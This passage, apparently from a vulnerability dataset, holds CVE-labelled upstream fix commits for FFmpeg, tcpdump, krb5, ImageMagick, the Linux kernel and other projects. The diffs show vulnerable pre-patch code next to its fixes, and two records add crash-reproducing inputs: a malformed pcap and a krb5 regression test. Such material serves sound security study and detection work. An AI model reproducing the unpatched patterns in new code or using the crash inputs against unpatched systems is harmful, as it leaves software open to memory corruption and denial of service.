use_box_blur = FALSE;\n-    else\n-        use_box_blur = TRUE;\n-\n     /* Bail out by just copying? */\n     if ((sx == 0.0 && sy == 0.0)\n         || sx > 1000 || sy > 1000) {\n@@ -1845,6 +1838,15 @@ gaussian_blur_surface (cairo_surface_t *in,\n         int y;\n         guchar *row_buffer = NULL;\n         guchar *row1, *row2;\n+        gboolean use_box_blur;\n+\n+        /* For small radiuses, use a true gaussian kernel; otherwise use three box blurs with\n+         * clever offsets.\n+         */\n+        if (sx < 10.0)\n+            use_box_blur = FALSE;\n+        else\n+            use_box_blur = TRUE;\n \n         if (use_box_blur) {\n             box_width = compute_box_blur_width (sx);\n@@ -1900,6 +1902,15 @@ gaussian_blur_surface (cairo_surface_t *in,\n         guchar *col_buffer;\n         guchar *col1, *col2;\n         int x;\n+        gboolean use_box_blur;\n+\n+        /* For small radiuses, use a true gaussian kernel; otherwise use three box blurs with\n+         * clever offsets.\n+         */\n+        if (sy < 10.0)\n+            use_box_blur = FALSE;\n+        else\n+            use_box_blur = TRUE;\n \n         /* twice the size so we can have the source pixels and the blurred pixels */\n         col_buffer = g_new0 (guchar, height * bpp * 2);\n", "owner": "GNOME", "repo": "librsvg", "source": "cve"}
{"CVE_ID": "CVE-2018-19840", "CWE_ID": "400", "category": "security", "commit_id": "070ef6f138956d9ea9612e69586152339dbefe51", "commit_message": "From 070ef6f138956d9ea9612e69586152339dbefe51 Mon Sep 17 00:00:00 2001\nFrom: David Bryant <david@wavpack.com>\nDate: Thu, 29 Nov 2018 21:00:42 -0800\nSubject: [PATCH] issue #53: error out on zero sample rate\n\n---\n src/pack_utils.c | 5 +++++\n 1 file changed, 5 insertions(+)\n\n", "diff_code": "diff --git a/src/pack_utils.c b/src/pack_utils.c\nindex 2253f0d..2a83497 100644\n--- a/src/pack_utils.c\n+++ b/src/pack_utils.c\n@@ -195,6 +195,11 @@ int WavpackSetConfiguration64 (WavpackContext *wpc, WavpackConfig *config, int64\n     int num_chans = config->num_channels;\n     int i;\n \n+    if (!config->sample_rate) {\n+        strcpy (wpc->error_message, \"sample rate cannot be zero!\");\n+        return FALSE;\n+    }\n+\n     wpc->stream_version = (config->flags & CONFIG_COMPATIBLE_WRITE) ? CUR_STREAM_VERS : MAX_STREAM_VERS;\n \n     if ((config->qmode & QMODE_DSD_AUDIO) && config->bytes_per_sample == 1 && config->bits_per_sample == 8) {\n", "owner": "dbry", "repo": "WavPack", "source": "cve"}
{"CVE_ID": "CVE-2016-4804", "CWE_ID": "119", "category": "security", "commit_id": "e8eff147e9da1185f9afd5b25948153a3b97cf52", "commit_message": "From e8eff147e9da1185f9afd5b25948153a3b97cf52 Mon Sep 17 00:00:00 2001\nFrom: Andreas Bombe <aeb@debian.org>\nDate: Wed, 27 Apr 2016 21:38:37 +0200\nSubject: [PATCH] read_boot(): Handle excessive FAT size specifications\nMIME-Version: 1.0\nContent-Type: text/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\nThe variable used for storing the FAT size (in bytes) was an unsigned\nint. Since the size in sectors read from the BPB was not sufficiently\nchecked, this could end up being zero after multiplying it with the\nsector size while some offsets still stayed excessive. Ultimately it\nwould cause segfaults when accessing FAT entries for which no memory\nwas allocated.\n\nMake it more robust by changing the types used to store FAT size to\noff_t and abort if there is no room for data clusters. Additionally\ncheck that FAT size is not specified as zero.\n\nFixes #25 and fixes #26.\n\nReported-by: Hanno Böck\nSigned-off-by: Andreas Bombe <aeb@debian.org>\n---\n src/boot.c     | 14 +++++++++++---\n src/fsck.fat.h |  2 +-\n 2 files changed, 12 insertions(+), 4 deletions(-)\n\n", "diff_code": "diff --git a/src/boot.c b/src/boot.c\nindex 98b5ff9..491ecd9 100644\n--- a/src/boot.c\n+++ b/src/boot.c\n@@ -103,8 +103,8 @@ static void dump_boot(DOS_FS * fs, struct boot_sector *b, unsigned lss)\n \t   (unsigned long long)fs->fat_start,\n \t   (unsigned long long)fs->fat_start / lss);\n     printf(\"%10d FATs, %d bit entries\\n\", b->fats, fs->fat_bits);\n-    printf(\"%10d bytes per FAT (= %u sectors)\\n\", fs->fat_size,\n-\t   fs->fat_size / lss);\n+    printf(\"%10lld bytes per FAT (= %llu sectors)\\n\", (long long)fs->fat_size,\n+\t   (long long)fs->fat_size / lss);\n     if (!fs->root_cluster) {\n \tprintf(\"Root directory starts at byte %llu (sector %llu)\\n\",\n \t       (unsigned long long)fs->root_start,\n@@ -329,7 +329,7 @@ void read_boot(DOS_FS * fs)\n     struct boot_sector b;\n     unsigned total_sectors;\n     unsigned short logical_sector_size, sectors;\n-    unsigned fat_length;\n+    off_t fat_length;\n     unsigned total_fat_entries;\n     off_t data_size;\n \n@@ -358,8 +358,12 @@ void read_boot(DOS_FS * fs)\n     /* Can't access last odd sector anyway, so round down */\n     fs_test((off_t)((total_sectors & ~1) - 1) * logical_sector_size,\n \t    logical_sector_size);\n+\n     fat_length = le16toh(b.fat_length) ?\n \tle16toh(b.fat_length) : le32toh(b.fat32_length);\n+    if (!fat_length)\n+\tdie(\"FAT size is zero.\");\n+\n     fs->fat_start = (off_t)le16toh(b.reserved) * logical_sector_size;\n     fs->root_start = ((off_t)le16toh(b.reserved) + b.fats * fat_length) *\n \tlogical_sector_size;\n@@ -367,7 +371,11 @@ void read_boot(DOS_FS * fs)\n     fs->data_start = fs->root_start + ROUND_TO_MULTIPLE(fs->root_entries <<\n \t\t\t\t\t\t\tMSDOS_DIR_BITS,\n \t\t\t\t\t\t\tlogical_sector_size);\n+\n     data_size = (off_t)total_sectors * logical_sector_size - fs->data_start;\n+    if (data_size < fs->cluster_size)\n+\tdie(\"Filesystem has no space for any data clusters\");\n+\n     fs->data_clusters = data_size / fs->cluster_size;\n     fs->root_cluster = 0;\t/* indicates standard, pre-FAT32 root dir */\n     fs->fsinfo_start = 0;\t/* no FSINFO structure */\ndiff --git a/src/fsck.fat.h b/src/fsck.fat.h\nindex d150ab9..168049e 100644\n--- a/src/fsck.fat.h\n+++ b/src/fsck.fat.h\n@@ -152,7 +152,7 @@ typedef struct {\n typedef struct {\n     int nfats;\n     off_t fat_start;\n-    unsigned int fat_size;\t/* unit is bytes */\n+    off_t fat_size;\t\t/* unit is bytes */\n     unsigned int fat_bits;\t/* size of a FAT entry */\n     unsigned int eff_fat_bits;\t/* # of used bits in a FAT entry */\n     uint32_t root_cluster;\t/* 0 for old-style root dir */\n", "owner": "dosfstools", "repo": "dosfstools", "source": "cve"}
{"CVE_ID": "CVE-2017-11399", "CWE_ID": "125", "category": "security", "commit_id": "ba4beaf6149f7241c8bd85fe853318c2f6837ad0", "commit_message": "From ba4beaf6149f7241c8bd85fe853318c2f6837ad0 Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michael@niedermayer.cc>\nDate: Sun, 16 Jul 2017 14:57:20 +0200\nSubject: [PATCH] avcodec/apedec: Fix integer overflow\n\nFixes: out of array access\nFixes: PoC.ape and others\n\nFound-by: Bingchang, Liu@VARAS of IIE\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>\n---\n libavcodec/apedec.c | 8 +++++---\n 1 file changed, 5 insertions(+), 3 deletions(-)\n\n", "diff_code": "diff --git a/libavcodec/apedec.c b/libavcodec/apedec.c\nindex a6b14b8e247..15eb416ba4e 100644\n--- a/libavcodec/apedec.c\n+++ b/libavcodec/apedec.c\n@@ -1412,6 +1412,7 @@ static int ape_decode_frame(AVCodecContext *avctx, void *data,\n     int32_t *sample24;\n     int i, ch, ret;\n     int blockstodecode;\n+    uint64_t decoded_buffer_size;\n \n     /* this should never be negative, but bad things will happen if it is, so\n        check it just to make sure. */\n@@ -1467,7 +1468,7 @@ static int ape_decode_frame(AVCodecContext *avctx, void *data,\n                 skip_bits_long(&s->gb, offset);\n         }\n \n-        if (!nblocks || nblocks > INT_MAX) {\n+        if (!nblocks || nblocks > INT_MAX / 2 / sizeof(*s->decoded_buffer) - 8) {\n             av_log(avctx, AV_LOG_ERROR, \"Invalid sample count: %\"PRIu32\".\\n\",\n                    nblocks);\n             return AVERROR_INVALIDDATA;\n@@ -1493,8 +1494,9 @@ static int ape_decode_frame(AVCodecContext *avctx, void *data,\n         blockstodecode = s->samples;\n \n     /* reallocate decoded sample buffer if needed */\n-    av_fast_malloc(&s->decoded_buffer, &s->decoded_size,\n-                   2 * FFALIGN(blockstodecode, 8) * sizeof(*s->decoded_buffer));\n+    decoded_buffer_size = 2LL * FFALIGN(blockstodecode, 8) * sizeof(*s->decoded_buffer);\n+    av_assert0(decoded_buffer_size <= INT_MAX);\n+    av_fast_malloc(&s->decoded_buffer, &s->decoded_size, decoded_buffer_size);\n     if (!s->decoded_buffer)\n         return AVERROR(ENOMEM);\n     memset(s->decoded_buffer, 0, s->decoded_size);\n", "owner": "FFmpeg", "repo": "FFmpeg", "source": "cve"}
{"CVE_ID": "CVE-2011-1477", "CWE_ID": "119", "category": "security", "commit_id": "4d00135a680727f6c3be78f8befaac009030e4df", "commit_message": "From 4d00135a680727f6c3be78f8befaac009030e4df Mon Sep 17 00:00:00 2001\nFrom: Dan Rosenberg <drosenberg@vsecurity.com>\nDate: Wed, 23 Mar 2011 11:42:57 -0400\nSubject: [PATCH] sound/oss/opl3: validate voice and channel indexes\n\nUser-controllable indexes for voice and channel values may cause reading\nand writing beyond the bounds of their respective arrays, leading to\npotentially exploitable memory corruption.  Validate these indexes.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nCc: stable@kernel.org\nSigned-off-by: Takashi Iwai <tiwai@suse.de>\n---\n sound/oss/opl3.c | 15 +++++++++++++--\n 1 file changed, 13 insertions(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/sound/oss/opl3.c b/sound/oss/opl3.c\nindex cbf957424d5c3..407cd677950bc 100644\n--- a/sound/oss/opl3.c\n+++ b/sound/oss/opl3.c\n@@ -845,6 +845,10 @@ static int opl3_load_patch(int dev, int format, const char __user *addr,\n \n static void opl3_panning(int dev, int voice, int value)\n {\n+\n+\tif (voice < 0 || voice >= devc->nr_voice)\n+\t\treturn;\n+\n \tdevc->voc[voice].panning = value;\n }\n \n@@ -1062,8 +1066,15 @@ static int opl3_alloc_voice(int dev, int chn, int note, struct voice_alloc_info\n \n static void opl3_setup_voice(int dev, int voice, int chn)\n {\n-\tstruct channel_info *info =\n-\t&synth_devs[dev]->chn_info[chn];\n+\tstruct channel_info *info;\n+\n+\tif (voice < 0 || voice >= devc->nr_voice)\n+\t\treturn;\n+\n+\tif (chn < 0 || chn > 15)\n+\t\treturn;\n+\n+\tinfo = &synth_devs[dev]->chn_info[chn];\n \n \topl3_set_instr(dev, voice, info->pgm_num);\n \n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2016-3120", "CWE_ID": "476", "category": "security", "commit_id": "93b4a6306a0026cf1cc31ac4bd8a49ba5d034ba7", "commit_message": "From 93b4a6306a0026cf1cc31ac4bd8a49ba5d034ba7 Mon Sep 17 00:00:00 2001\nFrom: Greg Hudson <ghudson@mit.edu>\nDate: Tue, 19 Jul 2016 11:00:28 -0400\nSubject: [PATCH] Fix S4U2Self KDC crash when anon is restricted\n\nIn validate_as_request(), when enforcing restrict_anonymous_to_tgt,\nuse client.princ instead of request->client; the latter is NULL when\nvalidating S4U2Self requests.\n\nCVE-2016-3120:\n\nIn MIT krb5 1.9 and later, an authenticated attacker can cause krb5kdc\nto dereference a null pointer if the restrict_anonymous_to_tgt option\nis set to true, by making an S4U2Self request.\n\n  CVSSv2 Vector: AV:N/AC:H/Au:S/C:N/I:N/A:C/E:H/RL:OF/RC:C\n\nticket: 8458 (new)\ntarget_version: 1.14-next\ntarget_version: 1.13-next\n---\n src/kdc/kdc_util.c    | 2 +-\n src/tests/t_pkinit.py | 5 +++++\n 2 files changed, 6 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/src/kdc/kdc_util.c b/src/kdc/kdc_util.c\nindex 776e130e55..29f9dbbf07 100644\n--- a/src/kdc/kdc_util.c\n+++ b/src/kdc/kdc_util.c\n@@ -739,7 +739,7 @@ validate_as_request(kdc_realm_t *kdc_active_realm,\n         return(KDC_ERR_MUST_USE_USER2USER);\n     }\n \n-    if (check_anon(kdc_active_realm, request->client, request->server) != 0) {\n+    if (check_anon(kdc_active_realm, client.princ, request->server) != 0) {\n         *status = \"ANONYMOUS NOT ALLOWED\";\n         return(KDC_ERR_POLICY);\n     }\ndiff --git a/src/tests/t_pkinit.py b/src/tests/t_pkinit.py\nindex b66c458dff..f0214b6529 100755\n--- a/src/tests/t_pkinit.py\n+++ b/src/tests/t_pkinit.py\n@@ -93,6 +93,11 @@\n if 'KDC policy rejects request' not in out:\n     fail('Wrong error for restricted anonymous PKINIT')\n \n+# Regression test for #8458: S4U2Self requests crash the KDC if\n+# anonymous is restricted.\n+realm.kinit(realm.host_princ, flags=['-k'])\n+realm.run([kvno, '-U', 'user', realm.host_princ])\n+\n # Go back to a normal KDC and disable anonymous PKINIT.\n realm.stop_kdc()\n realm.start_kdc()\n", "owner": "krb5", "repo": "krb5", "source": "cve"}
{"CVE_ID": "CVE-2017-9499", "CWE_ID": "20", "category": "security", "commit_id": "7fd419441bc7103398e313558171d342c6315f44", "commit_message": "From 7fd419441bc7103398e313558171d342c6315f44 Mon Sep 17 00:00:00 2001\nFrom: Dirk Lemstra <dirk@git.imagemagick.org>\nDate: Mon, 15 May 2017 21:43:29 +0200\nSubject: [PATCH] Added check for incorrect number of meta channels report in\n #492.\n\n---\n coders/mpc.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n", "diff_code": "diff --git a/coders/mpc.c b/coders/mpc.c\nindex 8088da4925..86359572d1 100644\n--- a/coders/mpc.c\n+++ b/coders/mpc.c\n@@ -568,6 +568,9 @@ static Image *ReadMPCImage(const ImageInfo *image_info,ExceptionInfo *exception)\n                 if (LocaleCompare(keyword,\"number-meta-channels\") == 0)\n                   {\n                     image->number_meta_channels=StringToUnsignedLong(options);\n+                    if (image->number_meta_channels > MaxPixelChannels)\n+                      ThrowReaderException(CorruptImageError,\n+                        \"ImproperImageHeader\");\n                     break;\n                   }\n                 break;\n", "owner": "ImageMagick", "repo": "ImageMagick", "source": "cve"}
{"CVE_ID": "CVE-2016-8690", "CWE_ID": "476", "category": "security", "commit_id": "8f62b4761711d036fd8964df256b938c809b7fca", "commit_message": "From 8f62b4761711d036fd8964df256b938c809b7fca Mon Sep 17 00:00:00 2001\nFrom: Michael Adams <mdadams@ece.uvic.ca>\nDate: Sat, 15 Oct 2016 20:32:23 -0700\nSubject: [PATCH] Fixed a sanitizer failure in the BMP codec. Also, added a\n --debug-level command line option to the imginfo command for debugging\n purposes.\n\n---\n src/appl/imginfo.c          | 12 +++++++++++-\n src/libjasper/bmp/bmp_dec.c | 13 ++++++++++++-\n 2 files changed, 23 insertions(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/src/appl/imginfo.c b/src/appl/imginfo.c\nindex 8af19e9..f458a97 100644\n--- a/src/appl/imginfo.c\n+++ b/src/appl/imginfo.c\n@@ -85,7 +85,8 @@ typedef enum {\n \tOPT_HELP,\n \tOPT_VERSION,\n \tOPT_VERBOSE,\n-\tOPT_INFILE\n+\tOPT_INFILE,\n+\tOPT_DEBUG\n } optid_t;\n \n /******************************************************************************\\\n@@ -104,6 +105,7 @@ static jas_opt_t opts[] = {\n \t{OPT_VERSION, \"version\", 0},\n \t{OPT_VERBOSE, \"verbose\", 0},\n \t{OPT_INFILE, \"f\", JAS_OPT_HASARG},\n+\t{OPT_DEBUG, \"debug-level\", JAS_OPT_HASARG},\n \t{-1, 0, 0}\n };\n \n@@ -126,6 +128,7 @@ int main(int argc, char **argv)\n \tint numcmpts;\n \tint verbose;\n \tchar *fmtname;\n+\tint debug;\n \n \tif (jas_init()) {\n \t\tabort();\n@@ -135,6 +138,7 @@ int main(int argc, char **argv)\n \n \tinfile = 0;\n \tverbose = 0;\n+\tdebug = 0;\n \n \t/* Parse the command line options. */\n \twhile ((id = jas_getopt(argc, argv, opts)) >= 0) {\n@@ -146,6 +150,9 @@ int main(int argc, char **argv)\n \t\t\tprintf(\"%s\\n\", JAS_VERSION);\n \t\t\texit(EXIT_SUCCESS);\n \t\t\tbreak;\n+\t\tcase OPT_DEBUG:\n+\t\t\tdebug = atoi(jas_optarg);\n+\t\t\tbreak;\n \t\tcase OPT_INFILE:\n \t\t\tinfile = jas_optarg;\n \t\t\tbreak;\n@@ -156,6 +163,8 @@ int main(int argc, char **argv)\n \t\t}\n \t}\n \n+\tjas_setdbglevel(debug);\n+\n \t/* Open the image file. */\n \tif (infile) {\n \t\t/* The image is to be read from a file. */\n@@ -177,6 +186,7 @@ int main(int argc, char **argv)\n \n \t/* Decode the image. */\n \tif (!(image = jas_image_decode(instream, fmtid, 0))) {\n+\t\tjas_stream_close(instream);\n \t\tfprintf(stderr, \"cannot load image\\n\");\n \t\treturn EXIT_FAILURE;\n \t}\ndiff --git a/src/libjasper/bmp/bmp_dec.c b/src/libjasper/bmp/bmp_dec.c\nindex 7a6dcb1..6e7d880 100644\n--- a/src/libjasper/bmp/bmp_dec.c\n+++ b/src/libjasper/bmp/bmp_dec.c\n@@ -77,6 +77,7 @@\n #include \"jasper/jas_stream.h\"\n #include \"jasper/jas_image.h\"\n #include \"jasper/jas_malloc.h\"\n+#include \"jasper/jas_debug.h\"\n \n #include \"bmp_cod.h\"\n \n@@ -122,12 +123,22 @@ jas_image_t *bmp_decode(jas_stream_t *in, char *optstr)\n \t\tjas_eprintf(\"cannot get header\\n\");\n \t\treturn 0;\n \t}\n+\tJAS_DBGLOG(1, (\n+\t  \"BMP header: magic 0x%x; siz %d; res1 %d; res2 %d; off %d\\n\",\n+\t  hdr.magic, hdr.siz, hdr.reserved1, hdr.reserved2, hdr.off\n+\t  ));\n \n \t/* Read the bitmap information. */\n \tif (!(info = bmp_getinfo(in))) {\n \t\tjas_eprintf(\"cannot get info\\n\");\n \t\treturn 0;\n \t}\n+\tJAS_DBGLOG(1,\n+\t  (\"BMP information: len %d; width %d; height %d; numplanes %d; \"\n+\t  \"depth %d; enctype %d; siz %d; hres %d; vres %d; numcolors %d; \"\n+\t  \"mincolors %d\\n\", info->len, info->width, info->height, info->numplanes,\n+\t  info->depth, info->enctype, info->siz, info->hres, info->vres,\n+\t  info->numcolors, info->mincolors));\n \n \t/* Ensure that we support this type of BMP file. */\n \tif (!bmp_issupported(&hdr, info)) {\n@@ -440,7 +451,7 @@ static int bmp_getint32(jas_stream_t *in, int_fast32_t *val)\n \t\tif ((c = jas_stream_getc(in)) == EOF) {\n \t\t\treturn -1;\n \t\t}\n-\t\tv |= (c << 24);\n+\t\tv |= (JAS_CAST(uint_fast32_t, c) << 24);\n \t\tif (--n <= 0) {\n \t\t\tbreak;\n \t\t}\n", "owner": "mdadams", "repo": "jasper", "source": "cve"}
{"CVE_ID": "CVE-2017-13039", "CWE_ID": "119", "category": "security", "commit_id": "e0a5a02b0fc1900a69d6c37ed0aab36fb8494e6d", "commit_message": "From e0a5a02b0fc1900a69d6c37ed0aab36fb8494e6d Mon Sep 17 00:00:00 2001\nFrom: Guy Harris <guy@alum.mit.edu>\nDate: Sun, 11 Jun 2017 21:06:55 -0700\nSubject: [PATCH] CVE-2017-13039/IKEv1: Do more bounds checking.\n\nHave ikev1_attrmap_print() and ikev1_attr_print() do full bounds\nchecking, and return null on a bounds overflow.  Have their callers\ncheck for a null return.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't be rejected as an invalid capture.\n---\n print-isakmp.c                |  83 ++++++++++++++++++++++++----------\n tests/TESTLIST                |   1 +\n tests/isakmpv1-attr-oobr.out  |   3 ++\n tests/isakmpv1-attr-oobr.pcap | Bin 0 -> 135 bytes\n 4 files changed, 62 insertions(+), 25 deletions(-)\n create mode 100644 tests/isakmpv1-attr-oobr.out\n create mode 100644 tests/isakmpv1-attr-oobr.pcap\n\n", "diff_code": "diff --git a/print-isakmp.c b/print-isakmp.c\nindex 9de9b75d2..013de1c28 100644\n--- a/print-isakmp.c\n+++ b/print-isakmp.c\n@@ -912,21 +912,25 @@ struct attrmap {\n \n static const u_char *\n ikev1_attrmap_print(netdissect_options *ndo,\n-\t\t    const u_char *p, const u_char *ep,\n+\t\t    const u_char *p, const u_char *ep2,\n \t\t    const struct attrmap *map, size_t nmap)\n {\n \tint totlen;\n \tuint32_t t, v;\n \n+\tND_TCHECK(p[0]);\n \tif (p[0] & 0x80)\n \t\ttotlen = 4;\n-\telse\n+\telse {\n+\t\tND_TCHECK_16BITS(&p[2]);\n \t\ttotlen = 4 + EXTRACT_16BITS(&p[2]);\n-\tif (ep < p + totlen) {\n+\t}\n+\tif (ep2 < p + totlen) {\n \t\tND_PRINT((ndo,\"[|attr]\"));\n-\t\treturn ep + 1;\n+\t\treturn ep2 + 1;\n \t}\n \n+\tND_TCHECK_16BITS(&p[0]);\n \tND_PRINT((ndo,\"(\"));\n \tt = EXTRACT_16BITS(&p[0]) & 0x7fff;\n \tif (map && t < nmap && map[t].type)\n@@ -935,47 +939,71 @@ ikev1_attrmap_print(netdissect_options *ndo,\n \t\tND_PRINT((ndo,\"type=#%d \", t));\n \tif (p[0] & 0x80) {\n \t\tND_PRINT((ndo,\"value=\"));\n+\t\tND_TCHECK_16BITS(&p[2]);\n \t\tv = EXTRACT_16BITS(&p[2]);\n \t\tif (map && t < nmap && v < map[t].nvalue && map[t].value[v])\n \t\t\tND_PRINT((ndo,\"%s\", map[t].value[v]));\n-\t\telse\n-\t\t\trawprint(ndo, (const uint8_t *)&p[2], 2);\n+\t\telse {\n+\t\t\tif (!rawprint(ndo, (const uint8_t *)&p[2], 2)) {\n+\t\t\t\tND_PRINT((ndo,\")\"));\n+\t\t\t\tgoto trunc;\n+\t\t\t}\n+\t\t}\n \t} else {\n-\t\tND_PRINT((ndo,\"len=%d value=\", EXTRACT_16BITS(&p[2])));\n-\t\trawprint(ndo, (const uint8_t *)&p[4], EXTRACT_16BITS(&p[2]));\n+\t\tND_PRINT((ndo,\"len=%d value=\", totlen - 4));\n+\t\tif (!rawprint(ndo, (const uint8_t *)&p[4], totlen - 4)) {\n+\t\t\tND_PRINT((ndo,\")\"));\n+\t\t\tgoto trunc;\n+\t\t}\n \t}\n \tND_PRINT((ndo,\")\"));\n \treturn p + totlen;\n+\n+trunc:\n+\treturn NULL;\n }\n \n static const u_char *\n-ikev1_attr_print(netdissect_options *ndo, const u_char *p, const u_char *ep)\n+ikev1_attr_print(netdissect_options *ndo, const u_char *p, const u_char *ep2)\n {\n \tint totlen;\n \tuint32_t t;\n \n+\tND_TCHECK(p[0]);\n \tif (p[0] & 0x80)\n \t\ttotlen = 4;\n-\telse\n+\telse {\n+\t\tND_TCHECK_16BITS(&p[2]);\n \t\ttotlen = 4 + EXTRACT_16BITS(&p[2]);\n-\tif (ep < p + totlen) {\n+\t}\n+\tif (ep2 < p + totlen) {\n \t\tND_PRINT((ndo,\"[|attr]\"));\n-\t\treturn ep + 1;\n+\t\treturn ep2 + 1;\n \t}\n \n+\tND_TCHECK_16BITS(&p[0]);\n \tND_PRINT((ndo,\"(\"));\n \tt = EXTRACT_16BITS(&p[0]) & 0x7fff;\n \tND_PRINT((ndo,\"type=#%d \", t));\n \tif (p[0] & 0x80) {\n \t\tND_PRINT((ndo,\"value=\"));\n \t\tt = p[2];\n-\t\trawprint(ndo, (const uint8_t *)&p[2], 2);\n+\t\tif (!rawprint(ndo, (const uint8_t *)&p[2], 2)) {\n+\t\t\tND_PRINT((ndo,\")\"));\n+\t\t\tgoto trunc;\n+\t\t}\n \t} else {\n-\t\tND_PRINT((ndo,\"len=%d value=\", EXTRACT_16BITS(&p[2])));\n-\t\trawprint(ndo, (const uint8_t *)&p[4], EXTRACT_16BITS(&p[2]));\n+\t\tND_PRINT((ndo,\"len=%d value=\", totlen - 4));\n+\t\tif (!rawprint(ndo, (const uint8_t *)&p[4], totlen - 4)) {\n+\t\t\tND_PRINT((ndo,\")\"));\n+\t\t\tgoto trunc;\n+\t\t}\n \t}\n \tND_PRINT((ndo,\")\"));\n \treturn p + totlen;\n+\n+trunc:\n+\treturn NULL;\n }\n \n static const u_char *\n@@ -1256,11 +1284,12 @@ ikev1_t_print(netdissect_options *ndo, u_char tpay _U_,\n \tcp = (const u_char *)(p + 1);\n \tep2 = (const u_char *)p + item_len;\n \twhile (cp < ep && cp < ep2) {\n-\t\tif (map && nmap) {\n-\t\t\tcp = ikev1_attrmap_print(ndo, cp, (ep < ep2) ? ep : ep2,\n-\t\t\t\tmap, nmap);\n-\t\t} else\n-\t\t\tcp = ikev1_attr_print(ndo, cp, (ep < ep2) ? ep : ep2);\n+\t\tif (map && nmap)\n+\t\t\tcp = ikev1_attrmap_print(ndo, cp, ep2, map, nmap);\n+\t\telse\n+\t\t\tcp = ikev1_attr_print(ndo, cp, ep2);\n+\t\tif (cp == NULL)\n+\t\t\tgoto trunc;\n \t}\n \tif (ep < ep2)\n \t\tND_PRINT((ndo,\"...\"));\n@@ -1724,8 +1753,11 @@ ikev1_n_print(netdissect_options *ndo, u_char tpay _U_,\n \t\t\tsize_t nmap = sizeof(oakley_t_map)/sizeof(oakley_t_map[0]);\n \t\t\tND_PRINT((ndo,\" attrs=(\"));\n \t\t\twhile (cp < ep && cp < ep2) {\n-\t\t\t\tcp = ikev1_attrmap_print(ndo, cp,\n-\t\t\t\t\t(ep < ep2) ? ep : ep2, map, nmap);\n+\t\t\t\tcp = ikev1_attrmap_print(ndo, cp, ep2, map, nmap);\n+\t\t\t\tif (cp == NULL) {\n+\t\t\t\t\tND_PRINT((ndo,\")\"));\n+\t\t\t\t\tgoto trunc;\n+\t\t\t\t}\n \t\t\t}\n \t\t\tND_PRINT((ndo,\")\"));\n \t\t\tbreak;\n@@ -1926,10 +1958,11 @@ ikev2_t_print(netdissect_options *ndo, int tcount,\n \tep2 = (const u_char *)p + item_len;\n \twhile (cp < ep && cp < ep2) {\n \t\tif (map && nmap) {\n-\t\t\tcp = ikev1_attrmap_print(ndo, cp, (ep < ep2) ? ep : ep2,\n-\t\t\t\tmap, nmap);\n+\t\t\tcp = ikev1_attrmap_print(ndo, cp, ep2, map, nmap);\n \t\t} else\n-\t\t\tcp = ikev1_attr_print(ndo, cp, (ep < ep2) ? ep : ep2);\n+\t\t\tcp = ikev1_attr_print(ndo, cp, ep2);\n+\t\tif (cp == NULL)\n+\t\t\tgoto trunc;\n \t}\n \tif (ep < ep2)\n \t\tND_PRINT((ndo,\"...\"));\ndiff --git a/tests/TESTLIST b/tests/TESTLIST\nindex bdc7ff40c..a830b0cda 100644\n--- a/tests/TESTLIST\n+++ b/tests/TESTLIST\n@@ -553,6 +553,7 @@ ip6_frag_asan\t\tip6_frag_asan.pcap\t\tip6_frag_asan.out\t-v\n radius_attr_asan\tradius_attr_asan.pcap\t\tradius_attr_asan.out\t-v\n ospf6_decode_v3_asan\tospf6_decode_v3_asan.pcap\tospf6_decode_v3_asan.out -v\n ip_ts_opts_asan\t\tip_ts_opts_asan.pcap\t\tip_ts_opts_asan.out\t-v\n+isakmpv1-attr-oobr\tisakmpv1-attr-oobr.pcap\t\tisakmpv1-attr-oobr.out\t-v\n \n # bad packets from Katie Holly\n mlppp-oobr\t\tmlppp-oobr.pcap\t\t\tmlppp-oobr.out\ndiff --git a/tests/isakmpv1-attr-oobr.out b/tests/isakmpv1-attr-oobr.out\nnew file mode 100644\nindex 000000000..0816735ba\n--- /dev/null\n+++ b/tests/isakmpv1-attr-oobr.out\n@@ -0,0 +1,3 @@\n+IP (tos 0x60, ttl 254, id 40192, offset 0, flags [+, DF, rsvd], proto UDP (17), length 63264, options (unknown 255 [bad length 18]), bad cksum 8e30 (->f45)!)\n+    251.73.77.150.32514 > 126.172.128.5.500: isakmp 1.0 msgid 2200af01: phase 2/others ? #40:\n+    (t: #243 id=241 (type=#9472 len=2 value=0619) [|t]) (len mismatch: isakmp 4293885728/ip 2140)\ndiff --git a/tests/isakmpv1-attr-oobr.pcap b/tests/isakmpv1-attr-oobr.pcap\nnew file mode 100644\nindex 0000000000000000000000000000000000000000..53619af434e013d95bcaaaec59d2ae510d88645d\nGIT binary patch\nliteral 135\nzcmca|c+)~A1{MY&U<48IFvhQ{U<Y1CWf1>=JtNcFm2+24i@tTR0jQLN!9C%-!d!+2\nz4F3fC41Rn1PODqf!1`b4f4wW?>i_jjj9)lXz}i^<|7R`Nnalrxq2d1vW&sTbC5H8k\nZ|KHau0A&R}fBeOu%D}+HCMmH@9suMpEF=H`\n\nliteral 0\nHcmV?d00001\n\n", "owner": "the-tcpdump-group", "repo": "tcpdump", "source": "cve"}
{"CVE_ID": "CVE-2014-0205", "CWE_ID": "119", "category": "security", "commit_id": "7ada876a8703f23befbb20a7465a702ee39b1704", "commit_message": "From 7ada876a8703f23befbb20a7465a702ee39b1704 Mon Sep 17 00:00:00 2001\nFrom: Darren Hart <dvhart@linux.intel.com>\nDate: Sun, 17 Oct 2010 08:35:04 -0700\nSubject: [PATCH] futex: Fix errors in nested key ref-counting\nMIME-Version: 1.0\nContent-Type: text/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\nfutex_wait() is leaking key references due to futex_wait_setup()\nacquiring an additional reference via the queue_lock() routine. The\nnested key ref-counting has been masking bugs and complicating code\nanalysis. queue_lock() is only called with a previously ref-counted\nkey, so remove the additional ref-counting from the queue_(un)lock()\nfunctions.\n\nAlso futex_wait_requeue_pi() drops one key reference too many in\nunqueue_me_pi(). Remove the key reference handling from\nunqueue_me_pi(). This was paired with a queue_lock() in\nfutex_lock_pi(), so the count remains unchanged.\n\nDocument remaining nested 